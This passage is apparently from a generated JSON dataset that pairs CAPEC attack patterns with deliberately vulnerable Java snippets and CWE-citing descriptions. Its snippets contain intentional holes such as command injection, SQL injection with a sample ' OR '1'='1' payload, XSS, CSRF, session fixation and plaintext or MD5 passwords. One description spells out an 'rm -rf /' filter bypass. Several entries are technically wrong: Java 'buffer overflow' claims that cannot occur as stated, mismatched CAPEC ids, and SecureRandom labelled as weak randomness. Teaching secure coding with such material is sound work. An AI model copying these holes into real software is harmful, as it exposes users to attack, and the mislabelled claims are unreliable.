        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.print(\"Enter command: \");\n        String userInput = reader.readLine();\n\n        // Early validation before filtering\n        if (userInput.contains(\"rm\")) {\n            System.out.println(\"Invalid command\");\n            return;\n        }\n\n        // First parser layer: remove escape characters\n        userInput = userInput.replace(\"\\\\\", \"\");\n\n        // Second parser layer: execute command\n        Runtime.getRuntime().exec(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where input validation is performed before filtering and parsing layers, embodying the CAPEC concept of 'Exploiting Multiple Input Interpretation Layers'. The code reads a command from the user and checks if it contains the string 'rm' to prevent dangerous commands. However, this validation occurs before escape characters are removed. An attacker could input a command like '\\rm -rf /' which would pass the initial validation but become 'rm -rf /' after the escape characters are stripped, leading to a dangerous command being executed. This example highlights CWE-179 (Incorrect Behavior Order: Early Validation) and CWE-78 (Improper Neutralization of Special Elements used in an OS Command)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableImageLoader {\n    public static void main(String[] args) {\n        try {\n            FileInputStream fis = new FileInputStream(\"image.jpg\");\n            byte[] buffer = new byte[1024];\n            int bytesRead = fis.read(buffer);\n            fis.close();\n            // Vulnerable code: no size check before copying\n            byte[] imageData = new byte[bytesRead];\n            System.arraycopy(buffer, 0, imageData, 0, bytesRead);\n            // Process the image data (dummy processing)\n            System.out.println(\"Image loaded successfully\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable image loader that reads an image file ('image.jpg') into a buffer without proper size checks, leading to a potential buffer overflow. The code reads the file into a fixed-size buffer of 1024 bytes and then copies the data into another byte array without verifying the actual size of the input. This can lead to a buffer overflow if the file size exceeds the buffer size, allowing an attacker to execute arbitrary code. This example embodies the main idea of the CAPEC 'Overflow Binary Resource File' and highlights CWE-120 ('Buffer Copy without Checking Size of Input') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer')."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import java.io.*;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) {\n        try {\n            // Create a symbolic link\n            File symLink = new File(\"/tmp/symlink\");\n            File targetFile = new File(\"/tmp/target\");\n            Process p = Runtime.getRuntime().exec(\"ln -s \" + targetFile.getAbsolutePath() + \" \" + symLink.getAbsolutePath());\n            p.waitFor();\n\n            // Read from the symbolic link\n            BufferedReader reader = new BufferedReader(new FileReader(symLink));\n            char[] buffer = new char[10];\n            int charsRead = reader.read(buffer);\n\n            // Vulnerable buffer copy without checking size\n            char[] vulnerableBuffer = new char[5];\n            System.arraycopy(buffer, 0, vulnerableBuffer, 0, charsRead); // CWE-120\n\n            reader.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The code creates a symbolic link pointing to a target file and then reads from the symbolic link into a buffer. The vulnerability arises when the code copies data from the buffer to a smaller buffer without checking the size, leading to a classic buffer overflow (CWE-120). This example embodies the main idea of the CAPEC by showing how symbolic links can be manipulated to cause buffer overflows due to insufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class VulnerableConfigParser {\n    public static void main(String[] args) {\n        String filePath = \"config.txt\";\n        char[] buffer = new char[256]; // Fixed-size buffer\n\n        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = br.read(buffer, 0, buffer.length);\n            if (charsRead > 0) {\n                String configData = new String(buffer, 0, charsRead);\n                System.out.println(\"Config Data: \" + configData);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable configuration file parser that reads data from a file into a fixed-size buffer without proper input validation. The buffer is defined with a fixed size of 256 characters. The code reads the content of 'config.txt' into this buffer and then converts it to a string for further processing. This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' by potentially causing a buffer overflow if the configuration file contains more data than the buffer can hold. The related CWEs are represented as follows:\n- CWE-120: The code copies data from the file to the buffer without checking if the file's content exceeds the buffer size.\n- CWE-118 and CWE-119: The code does not restrict operations within the buffer's boundaries, leading to potential out-of-bounds access.\n- CWE-20: The code does not validate the input data from the file.\n- CWE-680: If the buffer size calculation were based on an integer operation, an integer overflow could lead to a buffer overflow.\nThis code snippet is a simplified example to illustrate the vulnerability and should not be used in production."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import java.util.Scanner;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your name: \");\n        String input = scanner.nextLine();\n\n        // Vulnerable code: buffer overflow via parameter expansion\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-131: Incorrect Calculation of Buffer Size\n        // CWE-20: Improper Input Validation\n        char[] buffer = new char[10];\n        for (int i = 0; i < input.length(); i++) {\n            buffer[i] = input.charAt(i); // No bounds checking\n        }\n\n        System.out.println(\"Hello, \" + new String(buffer));\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The program reads a user's input and attempts to copy it into a fixed-size buffer without checking if the input length exceeds the buffer size. This can lead to a buffer overflow if the input is longer than the buffer, potentially causing unexpected behavior or security issues. The code embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-131 (Incorrect Calculation of Buffer Size), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableFileAccess {\n    public static void main(String[] args) {\n        String input = args[0]; // Expecting a URL but could be a local file path\n        try {\n            URL url = new URL(input);\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (MalformedURLException e) {\n            System.err.println(\"Invalid URL format: \" + input);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a local file path can be passed to a function expecting a URL. The program takes an input string (expected to be a URL) from the command line arguments and attempts to open it as a URL. If the input is a local file path instead of a URL, the program will still attempt to read it, potentially exposing local file contents. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and highlights CWE-241 (Improper Handling of Unexpected Data Type) and CWE-706 (Use of Incorrectly-Resolved Name or Reference). The code does not validate whether the input is a valid URL, leading to potential misuse and security risks."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationSystem {\n    private Map<String, String> userDatabase = new HashMap<>();\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public AuthenticationSystem() {\n        // Storing passwords in plaintext (CWE-257)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"123456\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return false;\n        }\n\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        if (loginAttempts.getOrDefault(username, 0) >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem authSystem = new AuthenticationSystem();\n        System.out.println(authSystem.authenticate(\"user1\", \"wrongpassword\")); // false\n        System.out.println(authSystem.authenticate(\"user1\", \"password123\")); // true\n    }\n}",
        "description": "This Java code snippet represents a simple authentication system that embodies the main idea of CAPEC-112: Password Brute Forcing. The code includes several weaknesses related to the described CWEs:\n\n1. **Weak Password Requirements (CWE-521)**: The passwords used in the user database are weak and easily guessable.\n2. **Storing Passwords in a Recoverable Format (CWE-257)**: Passwords are stored in plaintext, making them vulnerable to attacks if the database is compromised.\n3. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The system allows up to 5 failed login attempts before locking the account, which is a basic measure but may still be insufficient against brute force attacks.\n\nThe `authenticate` method checks the username and password against the stored values and tracks the number of failed login attempts. If the maximum number of attempts is exceeded, the account is locked. This code demonstrates how an adversary could exploit weak password policies and insufficient brute force protection mechanisms to compromise user accounts."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class PasswordRecovery {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, String> securityQuestions = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Sample user data\n        userDatabase.put(\"user1\", \"password123\");\n        securityQuestions.put(\"user1\", \"What is your pet's name?\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n\n        if (userDatabase.containsKey(username)) {\n            System.out.println(securityQuestions.get(username));\n            String answer = scanner.nextLine();\n\n            // Weak security question check\n            if (answer.equalsIgnoreCase(\"fluffy\")) {\n                System.out.println(\"Your password is: \" + userDatabase.get(username));\n            } else {\n                System.out.println(\"Incorrect answer.\");\n            }\n        } else {\n            System.out.println(\"User not found.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139 (Password Recovery Exploitation). The code includes a simple user database and a security question mechanism for password recovery. The security question is weak and easily guessable, and the password is stored in plaintext, making it susceptible to unauthorized access. This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-521 (Weak Password Requirements). The code illustrates how an attacker could exploit a weak password recovery feature to gain access to a user's account."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class WebServiceRegistry {\n    private Map<String, String> registry = new HashMap<>();\n\n    public void addService(String serviceName, String serviceEndpoint) {\n        // CWE-314: Storing sensitive information in cleartext\n        registry.put(serviceName, serviceEndpoint);\n    }\n\n    public String getService(String serviceName) {\n        // CWE-285: No authorization check\n        return registry.get(serviceName);\n    }\n\n    public void removeService(String serviceName) {\n        // CWE-693: No protection mechanism for deletion\n        registry.remove(serviceName);\n    }\n\n    public static void main(String[] args) {\n        WebServiceRegistry registry = new WebServiceRegistry();\n        registry.addService(\"PaymentService\", \"http://malicious.example.com\"); // CWE-74: Injection of malicious endpoint\n        System.out.println(\"Service Endpoint: \" + registry.getService(\"PaymentService\"));\n        registry.removeService(\"PaymentService\");\n    }\n}",
        "description": "This Java code snippet represents a simple web service registry that can be poisoned, embodying the main idea of the CAPEC 'Poison Web Service Registry'. The registry allows adding, retrieving, and removing services without proper authorization checks (CWE-285), protection mechanisms (CWE-693), or secure storage (CWE-314). The 'addService' method stores service endpoints in cleartext, and the 'getService' method retrieves them without any authorization checks. The 'removeService' method allows deletion of services without any protection mechanism. The main method demonstrates how a malicious endpoint can be injected (CWE-74) into the registry, which can then be retrieved and used by unsuspecting service requesters."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import java.io.*;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"admin\\0password\";\n        try {\n            if (authenticate(userInput)) {\n                System.out.println(\"Access granted.\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static boolean authenticate(String input) throws IOException {\n        // Simulate reading from a file\n        BufferedReader reader = new BufferedReader(new FileReader(\"users.txt\"));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (line.equals(input)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `userInput` string contains a null byte (`\\0`), which is often used as a string terminator in many programming environments. The `authenticate` method reads lines from a file (`users.txt`) and compares them to the `userInput`. Due to the null byte, the comparison may not work as intended, potentially leading to incorrect authentication. This example highlights CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-697 (Incorrect Comparison), as the null byte can cause the input to be improperly handled or compared, leading to security issues."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import java.io.UnsupportedEncodingException;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"user\\u0000input\"; // User input with embedded null byte\n        String sanitizedInput = sanitizeInput(userInput);\n        if (isValidPath(sanitizedInput)) {\n            System.out.println(\"Valid path: \" + sanitizedInput);\n        } else {\n            System.out.println(\"Invalid path\");\n        }\n    }\n\n    public static String sanitizeInput(String input) {\n        try {\n            byte[] bytes = input.getBytes(\"UTF-8\");\n            StringBuilder sanitized = new StringBuilder();\n            for (byte b : bytes) {\n                if (b != 0) { // Remove null bytes\n                    sanitized.append((char) b);\n                }\n            }\n            return sanitized.toString();\n        } catch (UnsupportedEncodingException e) {\n            return input; // Fallback to original input in case of encoding error\n        }\n    }\n\n    public static boolean isValidPath(String path) {\n        return path.endsWith(\"/\"); // Check if the path ends with a slash\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The code takes user input that may contain an embedded null byte (\\u0000) and attempts to sanitize it by removing null bytes. The `isValidPath` function checks if the sanitized input ends with a slash ('/'). However, if the null byte is not properly handled, it could lead to incorrect validation, allowing an attacker to bypass the check. This snippet highlights issues related to CWE-158 (Improper Neutralization of Null Byte), CWE-172 (Encoding Error), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL Injection attacks. The code constructs an SQL query using user input without proper neutralization of special elements, which can lead to unauthorized access to sensitive information. The user input is directly concatenated into the SQL query, allowing an attacker to manipulate the query logic. This example embodies the main idea of CAPEC-147 (Query System for Information) by showing how an adversary can probe an application's structure and extract information through modified queries. The related CWEs are represented as follows: CWE-89 (SQL Injection), CWE-943 (Improper Neutralization of Special Elements in Data Query Logic), and CWE-209 (Generation of Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class PasswordStorage {\n    public static void main(String[] args) {\n        String password = \"password123\"; // CWE-521: Weak Password Requirements\n        String hashedPassword = hashPassword(password);\n        System.out.println(\"Stored Hash: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-916: Insufficient Computational Effort\n            byte[] hashBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable password storage mechanism. It uses MD5 hashing (CWE-916) to store a password, which is a weak hashing algorithm and can be easily cracked using rainbow tables. The password used ('password123') is also weak (CWE-521), making it easier for attackers to guess or crack. The code represents the main idea of CAPEC-261, where an attacker could use a rainbow table to crack the stored password hash and gain access to the system. The code highlights the importance of using strong, computationally expensive hashing algorithms and enforcing strong password policies to mitigate such attacks."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String request = in.readLine();\n            if (request.equals(\"AUTHENTICATE\")) {\n                // Vulnerable guard logic\n                String token = in.readLine();\n                if (token.equals(\"valid-token\")) {\n                    out.println(\"Authenticated\");\n                } else {\n                    out.println(\"Authentication Failed\");\n                }\n            } else if (request.equals(\"REPLAY\")) {\n                // Replay attack vulnerability\n                out.println(\"Authenticated\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server has a simple authentication mechanism where it expects a request with the string 'AUTHENTICATE' followed by a token. If the token matches 'valid-token', the client is authenticated. However, the server also contains a vulnerability where if it receives a 'REPLAY' request, it automatically responds with 'Authenticated' without any actual authentication check. This demonstrates the concept of removing or short-circuiting guard logic (CAPEC-207) and includes CWE-294 (Authentication Bypass by Capture-replay) by allowing a replay attack to bypass authentication. Additionally, it touches on CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to send the correct authentication request."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/sensitiveData\")\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"token\");\n\n        // CWE-287: Improper Authentication\n        if (sensitiveData != null && sensitiveData.equals(\"validToken\")) {\n            // CWE-642: External Control of Critical State Data\n            request.getSession().setAttribute(\"user\", \"authenticatedUser\");\n\n            // Simulate sensitive data retrieval\n            String retrievedData = \"Sensitive Information\";\n            response.getWriter().write(retrievedData);\n        } else {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Unauthorized access\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a REST-style application that is vulnerable to the CAPEC described. The servlet uses the HTTP GET method to process a request containing sensitive information in the query string (CWE-598). It performs improper authentication by simply checking if the 'token' parameter matches a hardcoded value (CWE-287). If the token is valid, it sets a session attribute to indicate the user is authenticated, which is an example of external control of critical state data (CWE-642). The code then retrieves and returns sensitive information without ensuring the integrity of the communication channel, making it susceptible to attacks once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/user\")\npublic class UserServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String action = request.getParameter(\"action\");\n        String userId = request.getParameter(\"userId\");\n\n        if (\"delete\".equals(action)) {\n            // No authorization check\n            deleteUser(userId);\n            response.getWriter().write(\"User deleted\");\n        } else if (\"update\".equals(action)) {\n            // No authorization check\n            String newName = request.getParameter(\"newName\");\n            updateUser(userId, newName);\n            response.getWriter().write(\"User updated\");\n        } else {\n            response.getWriter().write(\"Invalid action\");\n        }\n    }\n\n    private void deleteUser(String userId) {\n        // Code to delete user\n    }\n\n    private void updateUser(String userId, String newName) {\n        // Code to update user\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a RESTful privilege elevation vulnerability. The servlet handles HTTP GET requests to perform actions like deleting or updating a user based on the 'action' parameter. However, it lacks proper authorization checks, allowing any user to perform these actions regardless of their privileges. This embodies the CAPEC concept of 'Restful Privilege Elevation' and highlights related CWEs such as 'Improper Authorization' (CWE-285) and 'Trusting HTTP Permission Methods on the Server Side' (CWE-650). The code snippet shows how an attacker could exploit the lack of access control to perform unauthorized actions."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SessionManager {\n    private static final int SESSION_ID_LENGTH = 8; // CWE-6: Insufficient Session-ID Length\n    private static final String CHARACTERS = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\n    private static final SecureRandom random = new SecureRandom(); // CWE-330: Use of Insufficiently Random Values\n    private static final Map<String, String> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = generateSessionId();\n        sessions.put(sessionId, username);\n        return sessionId;\n    }\n\n    public static String getSessionUser(String sessionId) {\n        return sessions.get(sessionId); // CWE-488: Exposure of Data Element to Wrong Session\n    }\n\n    private static String generateSessionId() {\n        StringBuilder sessionId = new StringBuilder(SESSION_ID_LENGTH);\n        for (int i = 0; i < SESSION_ID_LENGTH; i++) {\n            sessionId.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));\n        }\n        return sessionId.toString();\n    }\n\n    public static void main(String[] args) {\n        String sessionId = createSession(\"user1\");\n        System.out.println(\"Session ID: \" + sessionId);\n        System.out.println(\"Session User: \" + getSessionUser(sessionId));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple session management system that is vulnerable to session credential falsification through prediction. The session IDs are generated using a fixed length (CWE-6) and a predictable character set, which makes them susceptible to prediction attacks (CAPEC-139). The use of SecureRandom (CWE-330) is intended to provide randomness, but the short length of the session ID (CWE-6) and the potential for insufficient entropy (CWE-331) still make it vulnerable. Additionally, the session data is stored in a HashMap, which can lead to exposure of data elements to the wrong session (CWE-488) if session IDs are guessed or reused. This code highlights the importance of using sufficiently long and unpredictable session IDs to prevent session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Retrieve session ID from request\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n\n        // Check if session exists\n        if (session == null || !session.getId().equals(sessionId)) {\n            // Create a new session if it doesn't exist or doesn't match\n            session = request.getSession(true);\n            session.setAttribute(\"user\", \"guest\");\n        }\n\n        // Simulate sensitive action\n        String user = (String) session.getAttribute(\"user\");\n        response.getWriter().println(\"Hello, \" + user + \"! You have accessed sensitive information.\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to session ID reuse, which can lead to session replay attacks. The code retrieves a session ID from the request parameters and checks if it matches the current session. If the session does not exist or the session ID does not match, a new session is created without invalidating the old session ID. This can allow an attacker to reuse a stolen session ID to gain unauthorized access to sensitive information. The code also lacks proper authentication and authorization checks, making it susceptible to various related CWEs such as authentication bypass, improper authorization, and exposure of sensitive information."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionFixationServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession();\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication check\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            // Authentication successful, but session ID is not invalidated\n            session.setAttribute(\"user\", username);\n            response.getWriter().println(\"Welcome, \" + username);\n        } else {\n            response.getWriter().println(\"Invalid credentials\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a session fixation vulnerability. When a user logs in with valid credentials, the session ID is not invalidated, allowing an attacker to use a pre-existing session ID to hijack the authenticated session. The code does not invalidate the session ID upon successful authentication, which is a critical security flaw. This example also touches on related CWEs such as improper control of a resource through its lifetime (CWE-664) and incorrect permission assignment for critical resources (CWE-732), as the session ID is not properly managed and secured."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class TransferFundsServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authenticated\");\n            return;\n        }\n\n        String amount = request.getParameter(\"amount\");\n        String account = request.getParameter(\"account\");\n\n        // Missing CSRF token validation\n        // Vulnerable to CSRF attack\n        transferFunds(account, amount);\n\n        response.getWriter().write(\"Funds transferred successfully\");\n    }\n\n    private void transferFunds(String account, String amount) {\n        // Logic to transfer funds\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Request Forgery (CSRF) vulnerability. The `doPost` method handles a fund transfer request. It checks if the user is authenticated by verifying the session, but it does not include any CSRF token validation. This omission allows an attacker to craft a malicious request that can be executed with the user's session, leading to unauthorized actions. The code snippet also highlights related weaknesses such as missing authentication for critical functions (CWE-306) and improper control of resources (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. The servlet takes user input from an HTTP GET request parameter named 'input' and directly includes it in the HTML response without any form of input validation or output encoding. This allows an attacker to inject malicious scripts into the 'input' parameter, which will then be executed in the context of the user's browser. This example embodies the main idea of CAPEC-79 (Cross-Site Scripting) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.net.URLDecoder;\n\n@WebServlet(\"/secure\")\npublic class SecureServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String path = request.getParameter(\"path\");\n        if (path != null) {\n            // Decode the URL-encoded path\n            String decodedPath = URLDecoder.decode(path, \"UTF-8\");\n            // Check if the decoded path contains forbidden sequences\n            if (decodedPath.contains(\"..\") || decodedPath.contains(\"%2e%2e\")) {\n                response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n                return;\n            }\n            // Proceed with the normal processing\n            response.getWriter().println(\"Accessing: \" + decodedPath);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing path parameter\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to improper handling of URL encoding and path traversal. The servlet takes a 'path' parameter from the request, decodes it using URLDecoder, and checks for forbidden sequences like '..' or '%2e%2e'. If such sequences are found, it denies access. However, this simplistic check can be bypassed by using alternate encodings or combinations of encoded and decoded characters, illustrating the CAPEC's main idea of using slashes and URL encoding to bypass validation logic. The code also touches on related CWEs such as improper handling of URL encoding (CWE-177), path traversal (CWE-22), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
